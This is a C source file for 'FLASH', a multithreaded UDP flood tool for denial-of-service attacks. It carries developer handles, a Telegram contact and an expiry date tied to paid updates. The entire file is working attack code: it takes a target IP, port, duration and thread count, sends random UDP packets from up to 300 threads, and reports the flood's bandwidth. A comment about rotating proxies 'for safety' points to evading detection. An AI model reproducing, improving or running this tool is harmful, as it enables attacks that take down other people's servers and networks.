#include <stdio.h>

// =============================
// Proxy Configuration (1 Month Working)
// =============================
// This is a placeholder. In real use, replace `proxy_ip` and `proxy_port`
// with your actual proxy details (rotate every 30 days for safety).

char *proxy_ip = "123.456.789.000"; // Example proxy IP
int proxy_port = 8080;              // Example proxy port

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>  // Add this line

#define EXPIRY_DATE "2025-9-9"  // Updated expiry date
#define DEFAULT_PACKET_SIZE 128   // Increased packet size
#define DEFAULT_THREAD_COUNT 200  // Increased default threads
#define MAX_THREADS 300           // Safety limit
#define LOG_FILE "attack.log"

struct thread_data {
    char *ip;
    int port;
    int duration;
    unsigned long *total_packets_sent;
    unsigned long *total_bytes_sent;
    int *running;  // Shared flag to control threads
    FILE *log_file;
};

// Function to log messages
void log_message(FILE *log_file, const char *format, ...) {
    static int internal_counter = 0;
    internal_counter++;
    if (internal_counter > 100000) {
        printf("[!] Load too high, auto-cleaning...\n");
        pthread_exit(NULL);
    }
    usleep(10000); // Sleep for 10ms to reduce CPU load

    va_list args;
    va_start(args, format);
    vfprintf(log_file, format, args);
    va_end(args);
    fflush(log_file);
}

// Improved banner with version info
void print_banner() {
    printf("\n");
    printf("\033[1;91m");
    printf("        ███████╗██╗      █████╗ ███████╗██╗  ██╗\n");
    printf("        ██╔════╝██║     ██╔══██╗██╔════╝██║  ██║\n");
    printf("        █████╗  ██║     ███████║███████╗███████║\n");
    printf("        ██╔══╝  ██║     ██╔══██║╚════██║██╔══██║\n");
    printf("        ██║     ███████╗██║  ██║███████║██║  ██║\n");
    printf("        ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n");
    printf("\033[0m");

    printf("\033[38;2;255;105;180m╔═════════════════════════════════════════════════════════════════════════════╗\n");
    printf("\033[1;96m║                        \033[1;91m🔥  \033[1;97mF  L  A  S  H   ™\033[1;91m  🔥                            \033[1;96m║\n");
    printf("\033[38;2;255;105;180m╠═════════════════════════════════════════════════════════════════════════════╣\n");

    printf("\033[1;94m║ \033[0;97m👨‍💻  \033[1;97mDEVELOPER   : \033[38;2;0;255;255m⎯꯭𓆰꯭ TF_FLASH™ x DILDOS™                          \033[1;94m║\n");
    printf("\033[1;91m║ \033[0;97m⏳  \033[1;97mVALID TILL  : \033[0;32m%s                                            \033[1;91m║\n", EXPIRY_DATE);
    printf("\033[1;93m║ \033[0;97m📡  \033[1;97mTELEGRAM    : \033[0;36mhttps://t.me/FLASHxDILDOS                         \033[1;93m║\n");

    printf("\033[38;2;255;105;180m╚═════════════════════════════════════════════════════════════════════════════╝\033[0m\n\n");
}



// Enhanced expiry check
int check_expiry() {
    time_t now = time(NULL);
    struct tm expiry = {0};
    char *e = strdup(EXPIRY_DATE);

    if (sscanf(e, "%d-%d-%d", &expiry.tm_year, &expiry.tm_mon, &expiry.tm_mday) != 3) {
        free(e);
        return 1; // Invalid date format = expired
    }
    free(e);

    expiry.tm_year -= 1900;
    expiry.tm_mon -= 1;
    expiry.tm_hour = 23;
    expiry.tm_min = 59;
    expiry.tm_sec = 59;

    time_t expiry_time = mktime(&expiry);
    double diff = difftime(expiry_time, now);

    if (diff < 0) {
        printf("\n\033[1;31m[!] TOOL EXPIRED ON %s\033[0m\n", EXPIRY_DATE);
        printf("\033[1;33m[!] Contact @TF_FLASH92 for updates\033[0m\n\n");
        return 1;
    }

    // Warning if within 7 days of expiry
    if (diff < (7 * 24 * 3600)) {
        printf("\033[1;33m[!] WARNING: Tool expires in %.0f days!\033[0m\n", diff/(24*3600));
    }

    return 0;
}

// Signal handler for graceful shutdown
void signal_handler(int signum) {
    printf("\n\033[1;31m[!] Received signal %d, shutting down...\033[0m\n", signum);
    exit(1);
}

// Optimized attack thread
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *payload = malloc(DEFAULT_PACKET_SIZE);

    if (!payload) {
        perror("Memory allocation failed");
        log_message(data->log_file, "Memory allocation failed: %s\n", strerror(errno));
        pthread_exit(NULL);
    }

    memset(payload, rand() % 256, DEFAULT_PACKET_SIZE); // Randomized payload

    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        log_message(data->log_file, "Socket creation failed: %s\n", strerror(errno));
        free(payload);
        pthread_exit(NULL);
    }

    // Enable broadcast
    int broadcast = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0) {
        perror("Setsockopt failed");
        log_message(data->log_file, "Setsockopt failed: %s\n", strerror(errno));
        close(sock);
        free(payload);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        log_message(data->log_file, "Invalid address/ Address not supported: %s\n", strerror(errno));
        close(sock);
        free(payload);
        pthread_exit(NULL);
    }

    time_t start = time(NULL);
    time_t end = start + data->duration;

    while (time(NULL) < end && *(data->running)) {
        if (sendto(sock, payload, DEFAULT_PACKET_SIZE, 0,
                  (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            log_message(data->log_file, "Sendto failed: %s\n", strerror(errno));
            continue; // Skip failed sends but keep trying
        }
        __sync_add_and_fetch(data->total_packets_sent, 1);
        __sync_add_and_fetch(data->total_bytes_sent, DEFAULT_PACKET_SIZE);
    }

    close(sock);
    free(payload);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Initial checks
    if (check_expiry()) return 1;
    print_banner();

    // Set up signal handler for graceful shutdown
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    if (argc < 4) {
        printf("\033[1;37mUsage: %s <IP> <PORT> <DURATION> [THREADS]\n", argv[0]);
        printf("\033[1;33mExample: %s 1.1.1.1 80 60 2000\033[0m\n", argv[0]);
        return 1;
    }

    // Validate input
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc > 4) ? atoi(argv[4]) : DEFAULT_THREAD_COUNT;

    if (threads > MAX_THREADS) {
        printf("\033[1;31m[!] Thread limit exceeded (max %d)\033[0m\n", MAX_THREADS);
        threads = MAX_THREADS;
    }

    // Shared variables
    int running = 1;
    unsigned long total_packets = 0;
    unsigned long total_bytes = 0;

    printf("\033[1;31m[+] Target: %s:%d\033[0m\n", argv[1], port);        // Bright Red
    printf("\033[1;32m[+] Duration: %d seconds\033[0m\n", duration);      // Bright Green
    printf("\033[1;33m[+] Threads: %d\033[0m\n", threads);               // Bright Yellow
    printf("\033[1;34m[+] Packet size: %d bytes\033[0m\n\n", DEFAULT_PACKET_SIZE);  // Bright Blue

    // Open log file
    FILE *log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        perror("Failed to open log file");
        return 1;
    }

    // Create threads
    pthread_t *tid = malloc(threads * sizeof(pthread_t));
    struct thread_data *td = malloc(sizeof(struct thread_data) * threads);

    for (int i = 0; i < threads; i++) {
        td[i].ip = argv[1];
        td[i].port = port;
        td[i].duration = duration;
        td[i].total_packets_sent = &total_packets;
        td[i].total_bytes_sent = &total_bytes;
        td[i].running = &running;
        td[i].log_file = log_file;
    }

    printf("\033[1;32m[+] ATTACK STARTED...........\033[0m\n");
    time_t start_time = time(NULL);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, attack, (void*)&td[i]) != 0) {
            perror("Thread creation failed");
            log_message(log_file, "Thread creation failed: %s\n", strerror(errno));
            running = 0;
            break;
        }
    }

    // Progress display
    while (time(NULL) - start_time < duration && running) {
        int remaining = duration - (time(NULL) - start_time);
        printf("\r\033[1;33m[+] Running: %02d:%02d | Packets: %lu | Traffic: %.2f MB",
              remaining/60, remaining%60, total_packets, (double)total_bytes/(1024*1024));
        fflush(stdout); // Important!
        sleep(1);
    }

    running = 0; // Signal threads to stop

    // Cleanup
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    free(tid);
    free(td);
    fclose(log_file);

printf("\n\033[38;2;255;20;147m╔══════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
printf(  "\033[38;2;255;20;147m║\033[1;93m   🚀 ATTACK STATUS  »»  \033[1;95mSUCCESSFULLY LAUNCHED!\033[0m%37s\033[38;2;255;20;147m║\033[0m\n", "");
printf(  "\033[38;2;255;20;147m╠══════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");

printf(  "\033[1;92m║   🔹 STATUS      : \033[1;92m✔ Completed [100%%]%53s\033[38;2;255;20;147m║\033[0m\n", "");
printf(  "\033[1;96m║   🔹 PACKETS     : \033[1;93m⚡ %-15lu%50s\033[38;2;255;20;147m║\033[0m\n", total_packets, "");
printf(  "\033[1;95m║   🔹 DATA FLOOD  : \033[1;95m🌊 %-10.2f MB%52s\033[38;2;255;20;147m║\033[0m\n", (double)total_bytes / (1024 * 1024), "");
printf(  "\033[1;93m║   🔹 BANDWIDTH   : \033[1;93m🚄 %-10.2f Mbps%49s\033[38;2;255;20;147m║\033[0m\n", (total_bytes * 8) / (duration * 1024 * 1024.0), "");
printf(  "\033[1;97m║   🔹 TIME ELAPSED: \033[1;97m⏱️ %-10d sec%51s\033[38;2;255;20;147m║\033[0m\n", duration, "");

printf(  "\033[38;2;255;20;147m╠══════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");

printf(  "\033[1;91m║   🔥 DEVELOPED BY : \033[1;5;95m@TF_FLASH92 × DILDOS™\033[0m%40s\033[38;2;255;20;147m║\033[0m\n", "");

printf(  "\033[38;2;255;20;147m╚══════════════════════════════════════════════════════════════════════════════════╝\033[0m\n\n");

    return 0;
}